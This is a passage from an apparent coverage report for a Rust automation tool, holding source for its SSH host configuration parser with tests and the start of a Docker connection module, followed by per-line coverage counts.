pub fn add_host(\u0026mut self, name: impl Into\u003cString\u003e, config: HostConfig) {\n        self.hosts.insert(name.into(), config);\n    }\n\n    /// Set default user\n    pub fn set_default_user(\u0026mut self, user: impl Into\u003cString\u003e) {\n        self.defaults.user = user.into();\n    }\n\n    /// Set default port\n    pub fn set_default_port(\u0026mut self, port: u16) {\n        self.defaults.port = port;\n    }\n\n    /// Set default timeout\n    pub fn set_default_timeout(\u0026mut self, timeout: u64) {\n        self.defaults.timeout = timeout;\n    }\n}\n\n/// Default connection settings\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct ConnectionDefaults {\n    /// Default username for connections\n    #[serde(default = \"default_user\")]\n    pub user: String,\n\n    /// Default port for SSH connections\n    #[serde(default = \"default_port\")]\n    pub port: u16,\n\n    /// Default connection timeout in seconds\n    #[serde(default = \"default_timeout\")]\n    pub timeout: u64,\n\n    /// Default number of connection retries\n    #[serde(default = \"default_retries\")]\n    pub retries: u32,\n\n    /// Delay between retries in seconds\n    #[serde(default = \"default_retry_delay\")]\n    pub retry_delay: u64,\n\n    /// Default identity files (private keys) to try\n    #[serde(default)]\n    pub identity_files: Vec\u003cString\u003e,\n\n    /// Use SSH agent for authentication\n    #[serde(default = \"default_true\")]\n    pub use_agent: bool,\n\n    /// Verify host keys\n    #[serde(default = \"default_true\")]\n    pub verify_host_key: bool,\n\n    /// Known hosts file path\n    #[serde(default)]\n    pub known_hosts_file: Option\u003cPathBuf\u003e,\n}\n\nfn default_user() -\u003e String {\n    std::env::var(\"USER\")\n        .or_else(|_| std::env::var(\"USERNAME\"))\n        .unwrap_or_else(|_| \"root\".to_string())\n}\n\nfn default_port() -\u003e u16 {\n    22\n}\n\nfn default_timeout() -\u003e u64 {\n    DEFAULT_TIMEOUT\n}\n\nfn default_retries() -\u003e u32 {\n    DEFAULT_RETRIES\n}\n\nfn default_retry_delay() -\u003e u64 {\n    DEFAULT_RETRY_DELAY\n}\n\nimpl Default for ConnectionDefaults {\n    fn default() -\u003e Self {\n        Self {\n            user: default_user(),\n            port: 22,\n            timeout: DEFAULT_TIMEOUT,\n            retries: DEFAULT_RETRIES,\n            retry_delay: DEFAULT_RETRY_DELAY,\n            identity_files: vec![],\n            use_agent: true,\n            verify_host_key: true,\n            known_hosts_file: None,\n        }\n    }\n}\n\n/// Host-specific configuration\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostConfig {\n    /// Actual hostname or IP address\n    pub hostname: Option\u003cString\u003e,\n\n    /// Port to connect to\n    pub port: Option\u003cu16\u003e,\n\n    /// Username for authentication\n    pub user: Option\u003cString\u003e,\n\n    /// Path to private key file\n    pub identity_file: Option\u003cString\u003e,\n\n    /// Password for authentication (not recommended)\n    #[serde(skip_serializing)]\n    pub password: Option\u003cString\u003e,\n\n    /// Connection timeout in seconds\n    pub connect_timeout: Option\u003cu64\u003e,\n\n    /// Number of connection retries\n    pub retries: Option\u003cu32\u003e,\n\n    /// Retry delay in seconds\n    pub retry_delay: Option\u003cu64\u003e,\n\n    /// Connection type (ssh, local, docker)\n    pub connection: Option\u003cString\u003e,\n\n    /// Proxy/jump host\n    pub proxy_jump: Option\u003cString\u003e,\n\n    /// Forward agent\n    #[serde(default)]\n    pub forward_agent: bool,\n\n    /// Compression\n    #[serde(default)]\n    pub compression: bool,\n\n    /// Server alive interval (seconds)\n    pub server_alive_interval: Option\u003cu64\u003e,\n\n    /// Server alive count max\n    pub server_alive_count_max: Option\u003cu32\u003e,\n\n    /// Strict host key checking\n    pub strict_host_key_checking: Option\u003cbool\u003e,\n\n    /// User known hosts file\n    pub user_known_hosts_file: Option\u003cString\u003e,\n\n    /// Extra SSH options\n    #[serde(default)]\n    pub options: HashMap\u003cString, String\u003e,\n}\n\nimpl HostConfig {\n    /// Create a new host config\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set hostname\n    pub fn hostname(mut self, hostname: impl Into\u003cString\u003e) -\u003e Self {\n        self.hostname = Some(hostname.into());\n        self\n    }\n\n    /// Set port\n    pub fn port(mut self, port: u16) -\u003e Self {\n        self.port = Some(port);\n        self\n    }\n\n    /// Set user\n    pub fn user(mut self, user: impl Into\u003cString\u003e) -\u003e Self {\n        self.user = Some(user.into());\n        self\n    }\n\n    /// Set identity file\n    pub fn identity_file(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.identity_file = Some(path.into());\n        self\n    }\n\n    /// Set connection timeout\n    pub fn timeout(mut self, timeout: u64) -\u003e Self {\n        self.connect_timeout = Some(timeout);\n        self\n    }\n\n    /// Enable/disable compression\n    pub fn compression(mut self, enabled: bool) -\u003e Self {\n        self.compression = enabled;\n        self\n    }\n\n    /// Set connection type\n    pub fn connection_type(mut self, conn_type: impl Into\u003cString\u003e) -\u003e Self {\n        self.connection = Some(conn_type.into());\n        self\n    }\n\n    /// Get the connection timeout as Duration\n    pub fn timeout_duration(\u0026self) -\u003e Duration {\n        Duration::from_secs(self.connect_timeout.unwrap_or(DEFAULT_TIMEOUT))\n    }\n\n    /// Get retry configuration\n    pub fn retry_config(\u0026self) -\u003e RetryConfig {\n        RetryConfig {\n            max_retries: self.retries.unwrap_or(DEFAULT_RETRIES),\n            retry_delay: Duration::from_secs(self.retry_delay.unwrap_or(DEFAULT_RETRY_DELAY)),\n            exponential_backoff: true,\n            max_delay: Duration::from_secs(30),\n        }\n    }\n}\n\n/// Retry configuration\n#[derive(Debug, Clone)]\npub struct RetryConfig {\n    /// Maximum number of retries\n    pub max_retries: u32,\n\n    /// Initial delay between retries\n    pub retry_delay: Duration,\n\n    /// Use exponential backoff\n    pub exponential_backoff: bool,\n\n    /// Maximum delay between retries\n    pub max_delay: Duration,\n}\n\nimpl Default for RetryConfig {\n    fn default() -\u003e Self {\n        Self {\n            max_retries: DEFAULT_RETRIES,\n            retry_delay: Duration::from_secs(DEFAULT_RETRY_DELAY),\n            exponential_backoff: true,\n            max_delay: Duration::from_secs(30),\n        }\n    }\n}\n\nimpl RetryConfig {\n    /// Calculate delay for a given retry attempt\n    pub fn delay_for_attempt(\u0026self, attempt: u32) -\u003e Duration {\n        if self.exponential_backoff {\n            let delay = self.retry_delay * 2u32.pow(attempt.min(10));\n            delay.min(self.max_delay)\n        } else {\n            self.retry_delay\n        }\n    }\n}\n\n/// SSH config file parser\npub struct SshConfigParser;\n\nimpl SshConfigParser {\n    /// Parse an SSH config file\n    pub fn parse_file(\n        path: impl AsRef\u003cPath\u003e,\n    ) -\u003e Result\u003cHashMap\u003cString, HostConfig\u003e, ConnectionError\u003e {\n        let content = fs::read_to_string(path.as_ref()).map_err(|e| {\n            ConnectionError::InvalidConfig(format!(\"Failed to read SSH config: {}\", e))\n        })?;\n        Self::parse(\u0026content)\n    }\n\n    /// Parse SSH config content\n    pub fn parse(content: \u0026str) -\u003e Result\u003cHashMap\u003cString, HostConfig\u003e, ConnectionError\u003e {\n        let mut hosts: HashMap\u003cString, HostConfig\u003e = HashMap::new();\n        let mut current_hosts: Vec\u003cString\u003e = Vec::new();\n        let mut current_config = HostConfig::default();\n\n        // Regex for matching Host directive\n        let host_re = Regex::new(r\"^\\s*Host\\s+(.+)$\").unwrap();\n        // Regex for matching key-value pairs\n        let kv_re = Regex::new(r\"^\\s*(\\w+)\\s+(.+)$\").unwrap();\n\n        for line in content.lines() {\n            let line = line.trim();\n\n            // Skip empty lines and comments\n            if line.is_empty() || line.starts_with('#') {\n                continue;\n            }\n\n            // Check for Host directive\n            if let Some(captures) = host_re.captures(line) {\n                // Save previous host config\n                if !current_hosts.is_empty() {\n                    for host in \u0026current_hosts {\n                        hosts.insert(host.clone(), current_config.clone());\n                    }\n                }\n\n                // Start new host(s)\n                let hosts_str = captures.get(1).unwrap().as_str();\n                current_hosts = hosts_str.split_whitespace().map(String::from).collect();\n                current_config = HostConfig::default();\n                continue;\n            }\n\n            // Parse key-value pairs\n            if let Some(captures) = kv_re.captures(line) {\n                let key = captures.get(1).unwrap().as_str().to_lowercase();\n                let value = captures.get(2).unwrap().as_str().trim().to_string();\n\n                // Remove quotes if present\n                let value = value.trim_matches('\"').to_string();\n\n                match key.as_str() {\n                    \"hostname\" =\u003e current_config.hostname = Some(value),\n                    \"port\" =\u003e {\n                        current_config.port = value.parse().ok();\n                    }\n                    \"user\" =\u003e current_config.user = Some(value),\n                    \"identityfile\" =\u003e {\n                        // Expand ~ in path\n                        let expanded = shellexpand::tilde(\u0026value).to_string();\n                        current_config.identity_file = Some(expanded);\n                    }\n                    \"connecttimeout\" =\u003e {\n                        current_config.connect_timeout = value.parse().ok();\n                    }\n                    \"proxyjump\" =\u003e current_config.proxy_jump = Some(value),\n                    \"forwardagent\" =\u003e {\n                        current_config.forward_agent = value.to_lowercase() == \"yes\";\n                    }\n                    \"compression\" =\u003e {\n                        current_config.compression = value.to_lowercase() == \"yes\";\n                    }\n                    \"serveraliveinterval\" =\u003e {\n                        current_config.server_alive_interval = value.parse().ok();\n                    }\n                    \"serveralivecountmax\" =\u003e {\n                        current_config.server_alive_count_max = value.parse().ok();\n                    }\n                    \"stricthostkeychecking\" =\u003e {\n                        current_config.strict_host_key_checking =\n                            match value.to_lowercase().as_str() {\n                                \"yes\" =\u003e Some(true),\n                                \"no\" =\u003e Some(false),\n                                _ =\u003e None,\n                            };\n                    }\n                    \"userknownhostsfile\" =\u003e {\n                        current_config.user_known_hosts_file = Some(value);\n                    }\n                    _ =\u003e {\n                        // Store unknown options\n                        current_config.options.insert(key, value);\n                    }\n                }\n            }\n        }\n\n        // Save last host config\n        if !current_hosts.is_empty() {\n            for host in \u0026current_hosts {\n                hosts.insert(host.clone(), current_config.clone());\n            }\n        }\n\n        Ok(hosts)\n    }\n}\n\n/// Match a host against a pattern (supports * and ?)\nfn matches_pattern(pattern: \u0026str, host: \u0026str) -\u003e bool {\n    // Convert glob pattern to regex\n    let regex_pattern = pattern\n        .replace('.', r\"\\.\")\n        .replace('*', \".*\")\n        .replace('?', \".\");\n\n    if let Ok(re) = Regex::new(\u0026format!(\"^{}$\", regex_pattern)) {\n        re.is_match(host)\n    } else {\n        false\n    }\n}\n\n/// Helper to expand paths with ~ and environment variables\npub fn expand_path(path: \u0026str) -\u003e PathBuf {\n    let expanded = shellexpand::full(path).unwrap_or_else(|_| path.into());\n    PathBuf::from(expanded.as_ref())\n}\n\n/// Get default identity files to try\npub fn default_identity_files() -\u003e Vec\u003cPathBuf\u003e {\n    let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from(\"~\"));\n    let ssh_dir = home.join(\".ssh\");\n\n    vec![\n        ssh_dir.join(\"id_ed25519\"),\n        ssh_dir.join(\"id_ecdsa\"),\n        ssh_dir.join(\"id_rsa\"),\n        ssh_dir.join(\"id_dsa\"),\n    ]\n    .into_iter()\n    .filter(|p| p.exists())\n    .collect()\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_default_config() {\n        let config = ConnectionConfig::default();\n        assert_eq!(config.defaults.port, 22);\n        assert_eq!(config.defaults.timeout, DEFAULT_TIMEOUT);\n        assert_eq!(config.defaults.retries, DEFAULT_RETRIES);\n    }\n\n    #[test]\n    fn test_host_config_builder() {\n        let config = HostConfig::new()\n            .hostname(\"example.com\")\n            .port(2222)\n            .user(\"admin\")\n            .timeout(60);\n\n        assert_eq!(config.hostname, Some(\"example.com\".to_string()));\n        assert_eq!(config.port, Some(2222));\n        assert_eq!(config.user, Some(\"admin\".to_string()));\n        assert_eq!(config.connect_timeout, Some(60));\n    }\n\n    #[test]\n    fn test_ssh_config_parsing() {\n        let config = r#\"\nHost example\n    HostName example.com\n    User admin\n    Port 2222\n    IdentityFile ~/.ssh/id_rsa\n\nHost *.internal\n    User internal\n    ProxyJump bastion\n\"#;\n\n        let hosts = SshConfigParser::parse(config).unwrap();\n\n        let example = hosts.get(\"example\").unwrap();\n        assert_eq!(example.hostname, Some(\"example.com\".to_string()));\n        assert_eq!(example.port, Some(2222));\n        assert_eq!(example.user, Some(\"admin\".to_string()));\n\n        let internal = hosts.get(\"*.internal\").unwrap();\n        assert_eq!(internal.user, Some(\"internal\".to_string()));\n        assert_eq!(internal.proxy_jump, Some(\"bastion\".to_string()));\n    }\n\n    #[test]\n    fn test_pattern_matching() {\n        assert!(matches_pattern(\"*.example.com\", \"server.example.com\"));\n        assert!(matches_pattern(\"web-?\", \"web-1\"));\n        assert!(!matches_pattern(\"*.example.com\", \"example.com\"));\n        assert!(matches_pattern(\"*\", \"anything\"));\n    }\n\n    #[test]\n    fn test_retry_config_delay() {\n        let config = RetryConfig::default();\n\n        let delay0 = config.delay_for_attempt(0);\n        let delay1 = config.delay_for_attempt(1);\n        let delay2 = config.delay_for_attempt(2);\n\n        assert!(delay1 \u003e delay0);\n        assert!(delay2 \u003e delay1);\n    }\n\n    #[test]\n    fn test_config_from_toml() {\n        let toml = r#\"\n[defaults]\nuser = \"admin\"\nport = 22\ntimeout = 60\n\n[hosts.webserver]\nhostname = \"192.168.1.100\"\nport = 2222\nuser = \"web\"\n\"#;\n\n        let config = ConnectionConfig::from_toml(toml).unwrap();\n        assert_eq!(config.defaults.user, \"admin\");\n        assert_eq!(config.defaults.timeout, 60);\n\n        let webserver = config.get_host(\"webserver\").unwrap();\n        assert_eq!(webserver.hostname, Some(\"192.168.1.100\".to_string()));\n        assert_eq!(webserver.port, Some(2222));\n    }\n}\n","traces":[{"line":49,"address":[24589088,24589289,24589283],"length":1,"stats":{"Line":1}},{"line":51,"address":[24589109],"length":1,"stats":{"Line":1}},{"line":52,"address":[24589119],"length":1,"stats":{"Line":1}},{"line":61,"address":[24600256],"length":1,"stats":{"Line":0}},{"line":62,"address":[24600264],"length":1,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[24600688],"length":1,"stats":{"Line":1}},{"line":75,"address":[24600721],"length":1,"stats":{"Line":1}},{"line":76,"address":[24600736],"length":1,"stats":{"Line":1}},{"line":80,"address":[24599152,24600191,24600143],"length":1,"stats":{"Line":0}},{"line":81,"address":[24599182],"length":1,"stats":{"Line":0}},{"line":82,"address":[24599212],"length":1,"stats":{"Line":0}},{"line":85,"address":[31530272,31529968,31530278],"length":1,"stats":{"Line":0}},{"line":86,"address":[31529985,31530036,31530138],"length":1,"stats":{"Line":0}},{"line":87,"address":[31530304,31530316,31530009],"length":1,"stats":{"Line":0}},{"line":88,"address":[31530104],"length":1,"stats":{"Line":0}},{"line":89,"address":[31530208],"length":1,"stats":{"Line":0}},{"line":92,"address":[24599362,24600007,24599281],"length":1,"stats":{"Line":0}},{"line":93,"address":[24599421],"length":1,"stats":{"Line":0}},{"line":94,"address":[24599768,24600120,24599854,24599648],"length":1,"stats":{"Line":0}},{"line":96,"address":[24599957,24600049],"length":1,"stats":{"Line":0}},{"line":100,"address":[24599388],"length":1,"stats":{"Line":0}},{"line":104,"address":[24600288],"length":1,"stats":{"Line":1}},{"line":106,"address":[24600334],"length":1,"stats":{"Line":1}},{"line":107,"address":[24600389],"length":1,"stats":{"Line":1}},{"line":111,"address":[24600450,24600401],"length":1,"stats":{"Line":0}},{"line":112,"address":[24600594,24600548],"length":1,"stats":{"Line":0}},{"line":113,"address":[24600629],"length":1,"stats":{"Line":0}},{"line":114,"address":[24600669],"length":1,"stats":{"Line":0}},{"line":119,"address":[24600576],"length":1,"stats":{"Line":0}},{"line":123,"address":[24598224,24599122,24599128],"length":1,"stats":{"Line":0}},{"line":124,"address":[24598304],"length":1,"stats":{"Line":0}},{"line":127,"address":[24598639,24598345,24598409],"length":1,"stats":{"Line":0}},{"line":128,"address":[24598516,24598446],"length":1,"stats":{"Line":0}},{"line":130,"address":[24598701,24598415,24598648],"length":1,"stats":{"Line":0}},{"line":131,"address":[24598679],"length":1,"stats":{"Line":0}},{"line":133,"address":[24598707,24598759,24598654],"length":1,"stats":{"Line":0}},{"line":134,"address":[24598741],"length":1,"stats":{"Line":0}},{"line":136,"address":[24598820,24598765,24598713],"length":1,"stats":{"Line":0}},{"line":137,"address":[24598799],"length":1,"stats":{"Line":0}},{"line":139,"address":[24598870,24598826,24598771,24599117],"length":1,"stats":{"Line":0}},{"line":140,"address":[24598994,24598904],"length":1,"stats":{"Line":0}},{"line":143,"address":[24598837],"length":1,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[24600208],"length":1,"stats":{"Line":0}},{"line":158,"address":[24600221],"length":1,"stats":{"Line":0}},{"line":162,"address":[24600240],"length":1,"stats":{"Line":0}},{"line":163,"address":[24600250],"length":1,"stats":{"Line":0}},{"line":207,"address":[24590176],"length":1,"stats":{"Line":1}},{"line":208,"address":[24590190],"length":1,"stats":{"Line":1}},{"line":209,"address":[31529072,31529056],"length":1,"stats":{"Line":1}},{"line":210,"address":[24590233],"length":1,"stats":{"Line":1}},{"line":230,"address":[24604720,24604940,24604946],"length":1,"stats":{"Line":1}},{"line":232,"address":[24604738],"length":1,"stats":{"Line":1}},{"line":237,"address":[24604743],"length":1,"stats":{"Line":1}},{"line":306,"address":[24589584],"length":1,"stats":{"Line":1}},{"line":307,"address":[24589592],"length":1,"stats":{"Line":1}},{"line":311,"address":[31528924,31528656],"length":1,"stats":{"Line":1}},{"line":312,"address":[31528714,31528776],"length":1,"stats":{"Line":2}},{"line":313,"address":[31528901],"length":1,"stats":{"Line":1}},{"line":317,"address":[24589616],"length":1,"stats":{"Line":1}},{"line":318,"address":[24589636],"length":1,"stats":{"Line":1}},{"line":319,"address":[24589652],"length":1,"stats":{"Line":1}},{"line":323,"address":[31528368,31528636],"length":1,"stats":{"Line":1}},{"line":324,"address":[31528426,31528488],"length":1,"stats":{"Line":2}},{"line":325,"address":[31528613],"length":1,"stats":{"Line":1}},{"line":329,"address":[],"length":0,"stats":{"Line":0}},{"line":330,"address":[],"length":0,"stats":{"Line":0}},{"line":331,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[24589680],"length":1,"stats":{"Line":1}},{"line":336,"address":[24589697],"length":1,"stats":{"Line":1}},{"line":337,"address":[24589708],"length":1,"stats":{"Line":1}},{"line":341,"address":[24589312],"length":1,"stats":{"Line":0}},{"line":342,"address":[24589335],"length":1,"stats":{"Line":0}},{"line":343,"address":[24589343],"length":1,"stats":{"Line":0}},{"line":347,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":353,"address":[24589536],"length":1,"stats":{"Line":0}},{"line":354,"address":[24589544],"length":1,"stats":{"Line":0}},{"line":358,"address":[24589376],"length":1,"stats":{"Line":0}},{"line":360,"address":[24589399],"length":1,"stats":{"Line":0}},{"line":361,"address":[24589430],"length":1,"stats":{"Line":0}},{"line":363,"address":[24589466],"length":1,"stats":{"Line":0}},{"line":385,"address":[24587872],"length":1,"stats":{"Line":1}},{"line":388,"address":[24587886],"length":1,"stats":{"Line":1}},{"line":390,"address":[24587905],"length":1,"stats":{"Line":1}},{"line":397,"address":[24589728],"length":1,"stats":{"Line":1}},{"line":398,"address":[24589750,24589776],"length":1,"stats":{"Line":1}},{"line":399,"address":[24589787],"length":1,"stats":{"Line":1}},{"line":400,"address":[24589860],"length":1,"stats":{"Line":1}},{"line":402,"address":[24589761],"length":1,"stats":{"Line":0}},{"line":412,"address":[31529678,31529280,31529328],"length":1,"stats":{"Line":0}},{"line":415,"address":[31529485,31529696,31529945,31529373,31529302,31529939],"length":1,"stats":{"Line":0}},{"line":416,"address":[31529723,31529791],"length":1,"stats":{"Line":0}},{"line":418,"address":[31529640,31529567],"length":1,"stats":{"Line":0}},{"line":422,"address":[24591515,24590272,24597065],"length":1,"stats":{"Line":1}},{"line":423,"address":[24590342],"length":1,"stats":{"Line":1}},{"line":424,"address":[24590411],"length":1,"stats":{"Line":1}},{"line":425,"address":[24590479],"length":1,"stats":{"Line":1}},{"line":428,"address":[24590595,24590527],"length":1,"stats":{"Line":2}},{"line":430,"address":[24590629,24590701],"length":1,"stats":{"Line":2}},{"line":432,"address":[24590807,24590759],"length":1,"stats":{"Line":2}},{"line":433,"address":[24590986,24591614],"length":1,"stats":{"Line":2}},{"line":436,"address":[24591652],"length":1,"stats":{"Line":1}},{"line":441,"address":[24591771],"length":1,"stats":{"Line":1}},{"line":443,"address":[24592005,24591886],"length":1,"stats":{"Line":2}},{"line":444,"address":[24592093,24592011],"length":1,"stats":{"Line":2}},{"line":445,"address":[24592203,24592253],"length":1,"stats":{"Line":1}},{"line":450,"address":[24592385,24592067],"length":1,"stats":{"Line":2}},{"line":451,"address":[24592490,24592562],"length":1,"stats":{"Line":1}},{"line":452,"address":[24592677,24592699],"length":1,"stats":{"Line":1}},{"line":457,"address":[24592804,24591944],"length":1,"stats":{"Line":2}},{"line":458,"address":[24592937,24592988],"length":1,"stats":{"Line":2}},{"line":459,"address":[24593117,24593165],"length":1,"stats":{"Line":2}},{"line":462,"address":[24593395,24593312],"length":1,"stats":{"Line":2}},{"line":464,"address":[24593478,24593558],"length":1,"stats":{"Line":2}},{"line":465,"address":[24593580,24593661,24596788],"length":1,"stats":{"Line":2}},{"line":466,"address":[24593762,24593635,24596783],"length":1,"stats":{"Line":3}},{"line":467,"address":[24593818,24596675],"length":1,"stats":{"Line":2}},{"line":469,"address":[24593784,24593851,24596531,24593899],"length":1,"stats":{"Line":3}},{"line":470,"address":[24593873,24594000],"length":1,"stats":{"Line":2}},{"line":472,"address":[24596143,24594064],"length":1,"stats":{"Line":2}},{"line":473,"address":[24596373,24596282],"length":1,"stats":{"Line":1}},{"line":475,"address":[24594081,24596138,24594022],"length":1,"stats":{"Line":2}},{"line":476,"address":[24594137,24596064],"length":1,"stats":{"Line":0}},{"line":478,"address":[24594170,24595920,24594103,24594218],"length":1,"stats":{"Line":3}},{"line":479,"address":[24594192,24594319],"length":1,"stats":{"Line":0}},{"line":480,"address":[24594375,24595796],"length":1,"stats":{"Line":0}},{"line":482,"address":[24594408,24594341],"length":1,"stats":{"Line":0}},{"line":483,"address":[24594464,24595656],"length":1,"stats":{"Line":0}},{"line":485,"address":[24594497,24594430,24595635],"length":1,"stats":{"Line":0}},{"line":486,"address":[24594553,24595561],"length":1,"stats":{"Line":0}},{"line":488,"address":[24594586,24595540,24594519],"length":1,"stats":{"Line":0}},{"line":489,"address":[24595430,24594642],"length":1,"stats":{"Line":0}},{"line":491,"address":[24594675,24594608],"length":1,"stats":{"Line":0}},{"line":492,"address":[24595378],"length":1,"stats":{"Line":0}},{"line":493,"address":[24594731,24595160,24595258],"length":1,"stats":{"Line":0}},{"line":494,"address":[24595340,24595274],"length":1,"stats":{"Line":0}},{"line":495,"address":[24595317,24595370,24595354],"length":1,"stats":{"Line":0}},{"line":496,"address":[24595360],"length":1,"stats":{"Line":0}},{"line":499,"address":[24594761,24594697,24595142],"length":1,"stats":{"Line":0}},{"line":500,"address":[24595019,24594890],"length":1,"stats":{"Line":0}},{"line":504,"address":[24594981,24594767],"length":1,"stats":{"Line":0}},{"line":511,"address":[24591012],"length":1,"stats":{"Line":1}},{"line":512,"address":[24591051,24591223],"length":1,"stats":{"Line":2}},{"line":513,"address":[24591333,24591383],"length":1,"stats":{"Line":1}},{"line":517,"address":[24591094],"length":1,"stats":{"Line":1}},{"line":522,"address":[24598210,24597136,24598018],"length":1,"stats":{"Line":1}},{"line":524,"address":[24597239,24597349],"length":1,"stats":{"Line":2}},{"line":529,"address":[24597773,24597828,24597570],"length":1,"stats":{"Line":2}},{"line":530,"address":[24597883,24597939],"length":1,"stats":{"Line":2}},{"line":532,"address":[24597823],"length":1,"stats":{"Line":0}},{"line":537,"address":[24590111,24589904,24590117],"length":1,"stats":{"Line":0}},{"line":538,"address":[31528971,31528944],"length":1,"stats":{"Line":0}},{"line":539,"address":[24590076,24590003],"length":1,"stats":{"Line":0}},{"line":543,"address":[24601792,24600784,24601803],"length":1,"stats":{"Line":0}},{"line":544,"address":[24600801],"length":1,"stats":{"Line":0}},{"line":545,"address":[24600929,24600858],"length":1,"stats":{"Line":0}},{"line":547,"address":[24601070,24601468,24601385,24601277,24601798,24601169,24600971,24601029],"length":1,"stats":{"Line":0}},{"line":548,"address":[24601112,24601045],"length":1,"stats":{"Line":0}},{"line":549,"address":[24601220,24601152],"length":1,"stats":{"Line":0}},{"line":550,"address":[24601328,24601260],"length":1,"stats":{"Line":0}},{"line":551,"address":[24601368,24601436],"length":1,"stats":{"Line":0}},{"line":554,"address":[24601719],"length":1,"stats":{"Line":0}}],"covered":75,"coverable":171},{"path":["/","home","artur","Repositories","rustible","src","connection","docker.rs"],"content":"//! Docker connection module\n//!\n//! This module provides connectivity to Docker containers using the\n//! docker CLI commands. It allows executing commands inside containers\n//! and copying files to/from containers.\n\nuse async_trait::async_trait;\nuse std::path::Path;\nuse std::process::Stdio;\nuse tokio::process::Command;\nuse tracing::{debug, trace};\n\nuse super::{\n    CommandResult, Connection, ConnectionError, ConnectionResult, ExecuteOptions, FileStat,\n    TransferOptions,\n};\n\n/// Docker connection for executing commands inside containers\n#[derive(Debug, Clone)]\npub struct DockerConnection {\n    /// Container ID or name\n    container: String,\n    /// Docker executable path (default: \"docker\")\n    docker_path: String,\n    /// Whether to use docker compose exec instead of docker exec\n    use_compose: bool,\n    /// Service name for docker compose\n    compose_service: Option\u003cString\u003e,\n}\n\nimpl DockerConnection {\n    /// Create a new Docker connection\n    pub fn new(container: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            container: container.into(),\n            docker_path: \"docker\".to_string(),\n            use_compose: false,\n            compose_service: None,\n        }\n    }\n\n    /// Create a new Docker connection with a custom docker path\n    pub fn with_docker_path(container: impl Into\u003cString\u003e, docker_path: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            container: container.into(),\n            docker_path: docker_path.into(),\n            use_compose: false,\n            compose_service: None,\n        }\n    }\n\n    /// Create a Docker Compose connection\n    pub fn compose(service: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            container: String::new(),\n            docker_path: \"docker\".to_string(),\n            use_compose: true,\n            compose_service: Some(service.into()),\n        }\n    }\n\n    /// Set the container ID\n    pub fn container(mut self, container: impl Into\u003cString\u003e) -\u003e Self {\n        self.container = container.into();\n        self\n    }\n\n    /// Build the docker exec command\n    fn build_exec_command(\u0026self, command: \u0026str, options: \u0026ExecuteOptions) -\u003e Command {\n        let mut cmd = Command::new(\u0026self.docker_path);\n\n        if self.use_compose {\n            cmd.arg(\"compose\").arg(\"exec\");\n\n            // Add compose-specific options\n            cmd.arg(\"-T\"); // Disable pseudo-TTY\n\n            if let Some(service) = \u0026self.compose_service {\n                cmd.arg(service);\n            }\n        } else {\n            cmd.arg(\"exec\");\n\n            // Add docker exec options\n            cmd.arg(\"-i\"); // Keep STDIN open\n\n            // Set user if escalation is requested\n            if options.escalate {\n                let user = options.escalate_user.as_deref().unwrap_or(\"root\");\n                cmd.arg(\"-u\").arg(user);\n            }\n\n            // Set working directory\n            if let Some(cwd) = \u0026options.cwd {\n                cmd.arg(\"-w\").arg(cwd);\n            }\n\n            // Set environment variables\n            for (key, value) in \u0026options.env {\n                cmd.arg(\"-e\").arg(format!(\"{}={}\", key, value));\n            }\n\n            cmd.arg(\u0026self.container);\n        }\n\n        // Add the actual command\n        cmd.arg(\"sh\").arg(\"-c\").arg(command);\n\n        // Configure stdio\n        cmd.stdin(Stdio::null())\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped());\n\n        cmd\n    }\n\n    /// Build docker cp command for uploading\n    fn build_cp_to_container_command(\u0026self, local_path: \u0026Path, remote_path: \u0026Path) -\u003e Command {\n        let mut cmd = Command::new(\u0026self.docker_path);\n\n        cmd.arg(\"cp\")\n            .arg(local_path)\n            .arg(format!(\"{}:{}\", self.container, remote_path.display()));\n\n        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());\n        cmd\n    }\n\n    /// Build docker cp command for downloading\n    fn build_cp_from_container_command(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e Command {\n        let mut cmd = Command::new(\u0026self.docker_path);\n\n        cmd.arg(\"cp\")\n            .arg(format!(\"{}:{}\", self.container, remote_path.display()))\n            .arg(local_path);\n\n        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());\n        cmd\n    }\n\n    /// Check if container is running\n    async fn is_container_running(\u0026self) -\u003e ConnectionResult\u003cbool\u003e {\n        let mut cmd = Command::new(\u0026self.docker_path);\n\n        cmd.arg(\"inspect\")\n            .arg(\"-f\")\n            .arg(\"{{.State.Running}}\")\n            .arg(\u0026self.container)\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped());\n\n        let output = cmd.output().await.map_err(|e| {\n            ConnectionError::DockerError(format!(\"Failed to inspect container: {}\", e))\n        })?;\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout);\n        Ok(stdout.trim() == \"true\")\n    }\n\n    /// Get container info\n    pub async fn container_info(\u0026self) -\u003e ConnectionResult\u003cContainerInfo\u003e {\n        let mut cmd = Command::new(\u0026self.docker_path);\n\n        cmd.arg(\"inspect\")\n            .arg(\"-f\")\n            .arg(\"{{.Id}}|{{.Name}}|{{.State.Running}}|{{.Config.Image}}\")\n            .arg(\u0026self.container)\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped());\n\n        let output = cmd.output().await.map_err(|e| {\n            ConnectionError::DockerError(format!(\"Failed to inspect container: {}\", 